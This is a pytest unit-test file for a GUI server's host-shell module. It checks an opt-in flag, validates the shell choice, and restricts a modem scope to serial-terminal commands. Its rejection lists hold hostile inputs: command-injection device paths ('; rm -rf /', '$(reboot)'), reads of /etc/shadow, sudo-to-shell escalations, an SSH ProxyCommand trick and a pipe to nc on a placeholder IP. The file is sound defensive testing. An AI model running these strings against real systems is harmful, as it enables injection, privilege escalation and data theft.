# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2026 1oT OÜ. Authored by Hampus Hellsberg.

"""Unit coverage for ``yggdrasim_common.gui_server.host_shell`` capability gates.

Exercises:

* :func:`is_enabled` honours the ``YGGDRASIM_GUI_HOST_SHELL`` truthy
  set and stays default-off when the flag is unset.
* :func:`resolve_shell` rejects ``$SHELL`` values that are not listed
  in ``/etc/shells`` (or its in-test equivalent), accepts well-known
  paths, and falls back to ``/bin/bash`` / ``/bin/sh``.
* :func:`describe_capability` produces the JSON shape consumed by the
  SPA, with an explanation when disabled.
* :func:`is_safe_device_path` accepts the conventional
  ``/dev/ttyUSB*`` / ``/dev/ttyACM*`` / ``/dev/serial/by-id/*`` shapes
  and rejects anything that smells like shell injection.

The PTY spawn helper itself is not exercised here -- it forks a real
child and is covered by the route tests when those run.
"""

from __future__ import annotations

import pytest


@pytest.fixture(autouse=True)
def _clear_host_shell_env(monkeypatch, tmp_path):
    """Default-off posture mirrors a fresh shell."""
    monkeypatch.delenv("YGGDRASIM_GUI_HOST_SHELL", raising=False)
    monkeypatch.setenv("YGGDRASIM_RUNTIME_ROOT", str(tmp_path))
    yield


def test_is_enabled_default_off(monkeypatch):
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.is_enabled() is False


@pytest.mark.parametrize("truthy", ["1", "true", "TRUE", "yes", "On"])
def test_is_enabled_truthy_strings(monkeypatch, truthy):
    from yggdrasim_common.gui_server import host_shell

    monkeypatch.setenv("YGGDRASIM_GUI_HOST_SHELL", truthy)
    assert host_shell.is_enabled() is True


@pytest.mark.parametrize("falsey", ["", "0", "false", "no", "off", "maybe"])
def test_is_enabled_falsey_strings(monkeypatch, falsey):
    from yggdrasim_common.gui_server import host_shell

    monkeypatch.setenv("YGGDRASIM_GUI_HOST_SHELL", falsey)
    assert host_shell.is_enabled() is False


def test_resolve_shell_accepts_listed_shell(monkeypatch, tmp_path):
    from yggdrasim_common.gui_server import host_shell

    fake_etc = tmp_path / "etc_shells"
    fake_etc.write_text("/bin/bash\n/bin/sh\n# comment\n", encoding="utf-8")
    monkeypatch.setattr(host_shell, "_ETC_SHELLS", fake_etc)
    # /bin/bash typically exists on the test host. If it doesn't, the
    # fallback chain still produces a valid shell.
    chosen = host_shell.resolve_shell({"SHELL": "/bin/bash"})
    assert chosen is not None
    assert chosen.startswith("/")


def test_resolve_shell_rejects_unlisted(monkeypatch, tmp_path):
    from yggdrasim_common.gui_server import host_shell

    fake_etc = tmp_path / "etc_shells"
    fake_etc.write_text("/bin/bash\n/bin/sh\n", encoding="utf-8")
    monkeypatch.setattr(host_shell, "_ETC_SHELLS", fake_etc)
    chosen = host_shell.resolve_shell({"SHELL": "/usr/bin/curl"})
    # Must not echo the attacker-supplied path back; falls back to one
    # of the bundled defaults if available, else None.
    assert chosen != "/usr/bin/curl"


def test_resolve_shell_rejects_relative(monkeypatch, tmp_path):
    from yggdrasim_common.gui_server import host_shell

    fake_etc = tmp_path / "etc_shells"
    fake_etc.write_text("/bin/bash\n/bin/sh\n", encoding="utf-8")
    monkeypatch.setattr(host_shell, "_ETC_SHELLS", fake_etc)
    chosen = host_shell.resolve_shell({"SHELL": "bash"})
    assert chosen != "bash"


def test_resolve_shell_falls_back_when_unset(monkeypatch, tmp_path):
    from yggdrasim_common.gui_server import host_shell

    fake_etc = tmp_path / "etc_shells"
    fake_etc.write_text("/bin/bash\n/bin/sh\n", encoding="utf-8")
    monkeypatch.setattr(host_shell, "_ETC_SHELLS", fake_etc)
    chosen = host_shell.resolve_shell({})
    # In a stripped container both fallbacks may be absent, in which
    # case None is the correct answer; otherwise we expect /bin/bash or
    # /bin/sh.
    if chosen is not None:
        assert chosen in ("/bin/bash", "/bin/sh")


def test_describe_capability_disabled(monkeypatch):
    from yggdrasim_common.gui_server import host_shell

    snapshot = host_shell.describe_capability()
    assert snapshot["supported"] in (True, False)
    assert snapshot["enabled"] is False
    assert snapshot["shell"] is None
    assert "YGGDRASIM_GUI_HOST_SHELL" in (snapshot["reason"] or "")


def test_describe_capability_enabled(monkeypatch):
    from yggdrasim_common.gui_server import host_shell

    monkeypatch.setenv("YGGDRASIM_GUI_HOST_SHELL", "1")
    snapshot = host_shell.describe_capability()
    assert snapshot["enabled"] is True
    assert snapshot["reason"] is None
    if snapshot["supported"]:
        assert snapshot["shell"] is None or snapshot["shell"].startswith("/")


def test_describe_hil_modem_capability_does_not_require_full_host_shell(monkeypatch):
    from yggdrasim_common.gui_server import host_shell

    monkeypatch.delenv("YGGDRASIM_GUI_HOST_SHELL", raising=False)
    snapshot = host_shell.describe_hil_modem_capability()
    assert snapshot["scope"] == "hil-modem"
    if snapshot["supported"]:
        assert snapshot["enabled"] is True
        assert "tio" in snapshot["allowed_commands"]
        assert snapshot["default_command"] == "tio /dev/ttyUSB2"
        assert snapshot["default_command_source"] == "local"


def test_describe_hil_modem_capability_needs_no_opt_in() -> None:
    """The command policy is what makes this scope safe, not a gate.

    It launches no login shell and takes only a known serial terminal
    against an explicit device path, so an opt-in in front of it bought
    nothing an operator could act on and, being read once at startup,
    could not be turned on from the window that needed it.
    """
    from yggdrasim_common.gui_server import host_shell

    snapshot = host_shell.describe_hil_modem_capability()
    if snapshot["supported"]:
        assert snapshot["enabled"] is True
        assert snapshot["reason"] is None
        assert snapshot["command_policy"] == "serial-terminal-only"


def test_the_modem_scope_still_refuses_anything_but_a_serial_terminal() -> None:
    """Removing the gate must not widen what the scope will run."""
    from yggdrasim_common.gui_server import host_shell

    for rejected in ("bash", "sh -c 'id'", "cat /etc/shadow", "tio"):
        with pytest.raises(ValueError):
            host_shell.parse_hil_modem_command(rejected)

    assert host_shell.parse_hil_modem_command("tio /dev/ttyUSB2")[0].endswith("tio")


def test_sudo_is_allowed_in_front_of_a_serial_terminal() -> None:
    """A serial device is often root-owned and the udev rule is not always
    the operator's to write, so the wrapper is permitted."""
    from yggdrasim_common.gui_server import host_shell

    for accepted in (
        "sudo tio /dev/ttyUSB2",
        "sudo -n minicom -D /dev/ttyUSB2",
        "doas tio /dev/ttyACM0",
        "ssh -tt pi@rig.example.test sudo tio /dev/ttyUSB2",
    ):
        argv = host_shell.parse_hil_modem_command(accepted)
        # The wrapper survives into what is executed; validation reads
        # past it rather than stripping it from the command that runs.
        assert argv == accepted.split()


def test_sudo_may_not_become_a_shell() -> None:
    """The point of the scope is that it hands out no shell.

    Every sudo option but the harmless one is refused rather than
    reasoned about, so the word after the wrapper is always the command
    that runs.
    """
    from yggdrasim_common.gui_server import host_shell

    for rejected in (
        "sudo",
        "sudo -s",
        "sudo -i",
        "sudo --login",
        "sudo bash",
        "sudo sh -c 'id'",
        "sudo -u root bash",
        "sudo cat /etc/shadow",
        "sudo tio",
        "ssh -tt pi@rig.example.test sudo -s",
    ):
        with pytest.raises(ValueError):
            host_shell.parse_hil_modem_command(rejected)


def test_describe_hil_modem_capability_prefers_remote_card_bridge_target(
    monkeypatch,
) -> None:
    from yggdrasim_common.gui_server import host_shell
    from yggdrasim_common.gui_server.actions import card_bridge

    card_bridge._write_remote_rig_state({
        "ssh_target": "pi@example.test",
        "identity_file": "~/.ssh/id_rpi",
    })
    snapshot = host_shell.describe_hil_modem_capability()

    if snapshot["supported"]:
        assert snapshot["default_command_source"] == "remote-card-bridge"
        assert snapshot["remote_target"] == "pi@example.test"
        assert "ssh -tt" in snapshot["default_command"]
        assert "pi@example.test" in snapshot["default_command"]
        assert "tio /dev/ttyUSB2" in snapshot["default_command"]
        assert "sudo" not in snapshot["default_command"]


def test_the_default_command_does_not_reach_for_sudo() -> None:
    """Allowed when an operator asks for it, never offered by default.

    The default assumes the device is reachable, because granting the
    device is the better answer where the rule is yours to write.
    """
    from yggdrasim_common.gui_server import host_shell

    snapshot = host_shell.describe_hil_modem_capability()
    if snapshot["supported"]:
        assert "sudo" not in snapshot["default_command"]


def test_parse_hil_modem_command_accepts_unprivileged_tio() -> None:
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.parse_hil_modem_command("tio /dev/ttyUSB2") == [
        "tio",
        "/dev/ttyUSB2",
    ]


def test_parse_hil_modem_command_accepts_remote_ssh_tio() -> None:
    from yggdrasim_common.gui_server import host_shell

    command = (
        "ssh -tt -o BatchMode=yes -o ConnectTimeout=8 "
        "-i /home/user/.ssh/id_rpi pi@example.test tio /dev/ttyUSB2"
    )
    assert host_shell.parse_hil_modem_command(command) == [
        "ssh",
        "-tt",
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=8",
        "-i",
        "/home/user/.ssh/id_rpi",
        "pi@example.test",
        "tio",
        "/dev/ttyUSB2",
    ]


@pytest.mark.parametrize("command", [
    "bash",
    "sudo bash",
    "tio /etc/passwd",
    "python -c print(1)",
    "ssh -tt pi@example.test sudo bash",
    "ssh -tt -o ProxyCommand=sh pi@example.test sudo tio /dev/ttyUSB2",
    "ssh -tt pi@example.test sudo tio /etc/passwd",
])
def test_parse_hil_modem_command_rejects_non_serial_commands(command: str) -> None:
    from yggdrasim_common.gui_server import host_shell

    with pytest.raises(ValueError):
        host_shell.parse_hil_modem_command(command)


@pytest.mark.parametrize("path", [
    "/dev/ttyUSB0",
    "/dev/ttyUSB12",
    "/dev/ttyACM0",
    "/dev/ttyS3",
    "/dev/serial/by-id/usb-Telit_HE910-D_0123456789AB-if02",
])
def test_is_safe_device_path_accepts_real_shapes(path):
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.is_safe_device_path(path) is True


@pytest.mark.parametrize("path", [
    "",
    "/dev/null",
    "/dev/ttyUSB0; rm -rf /",
    "/etc/passwd",
    "../etc/passwd",
    "/dev/ttyUSB0\nls",
    "/dev/serial/by-id/../../etc/passwd",
    "/dev/ttyUSB0$(reboot)",
])
def test_is_safe_device_path_rejects_injections(path):
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.is_safe_device_path(path) is False


def test_is_safe_device_path_length_cap():
    from yggdrasim_common.gui_server import host_shell

    very_long = "/dev/serial/by-id/" + ("A" * 300)
    assert host_shell.is_safe_device_path(very_long) is False


def test_parse_host_command_splits_tio_launch():
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.parse_host_command("sudo tio /dev/ttyUSB2") == [
        "sudo",
        "tio",
        "/dev/ttyUSB2",
    ]


def test_parse_host_command_preserves_quoted_args():
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.parse_host_command('tio -m "INLCRNL,ONLCRNL" /dev/ttyUSB2') == [
        "tio",
        "-m",
        "INLCRNL,ONLCRNL",
        "/dev/ttyUSB2",
    ]


def test_parse_host_command_empty_means_login_shell():
    from yggdrasim_common.gui_server import host_shell

    assert host_shell.parse_host_command("") == []


@pytest.mark.parametrize("command", ['tio "unterminated', "tio " + ("A" * 600), "tio\0/dev/ttyUSB2"])
def test_parse_host_command_rejects_invalid(command):
    from yggdrasim_common.gui_server import host_shell

    with pytest.raises(ValueError):
        host_shell.parse_host_command(command)


HIL_MODEM_ACCEPTED_COMMANDS = (
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2",
    "ssh -tt -o BatchMode=yes -o ConnectTimeout=8 esim@rig.example.test tio /dev/ttyUSB2",
    "tio /dev/ttyUSB2",
    "sudo -n tio /dev/ttyUSB2",
    "tio -b 115200 /dev/ttyUSB2",
    "picocom -b 115200 /dev/ttyACM0",
    "tio /dev/serial/by-id/usb-Quectel_EG25-G_0123-if02-port0",
)

HIL_MODEM_REFUSED_COMMANDS = (
    # ssh joins everything after the target into one string for the rig's
    # login shell, so these are a shell on the rig, not a serial terminal.
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 ; bash",
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 && id",
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 | nc 192.0.2.1 4444",
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 $(id)",
    "ssh -tt esim@rig.example.test tio /dev/ttyUSB2 > /etc/passwd",
    # Options that make an allowed terminal run something or write a file.
    "screen -c /tmp/rc /dev/ttyUSB2",
    "minicom -S /tmp/script -D /dev/ttyUSB2",
    "minicom -C /tmp/capture -D /dev/ttyUSB2",
    "picocom --send-cmd /bin/sh /dev/ttyUSB2",
    "picocom --receive-cmd /bin/sh /dev/ttyUSB2",
)


def _validate_hil_modem_command(raw: str) -> None:
    import shlex

    from yggdrasim_common.gui_server import host_shell as hs

    argv = shlex.split(raw)
    if argv and argv[0] == "ssh":
        hs._validate_hil_modem_ssh_command(argv)
    else:
        hs._validate_hil_modem_terminal_command(argv)


@pytest.mark.parametrize("command", HIL_MODEM_ACCEPTED_COMMANDS)
def test_the_modem_shell_still_accepts_a_real_serial_terminal(command: str) -> None:
    """The scope has to stay usable: these are what operators actually type."""
    _validate_hil_modem_command(command)


@pytest.mark.parametrize("command", HIL_MODEM_REFUSED_COMMANDS)
def test_the_modem_shell_refuses_a_command_that_is_not_a_serial_terminal(
    command: str,
) -> None:
    """The hil-modem scope bypasses the host-shell env gate on purpose.

    It is reachable by anything holding the GUI bearer token, so it must
    hand out a serial port and nothing else. Checking only argv[0] and
    that some argument looks like a device left every other argument free,
    and over SSH those become shell syntax on the rig.
    """
    with pytest.raises(ValueError):
        _validate_hil_modem_command(command)
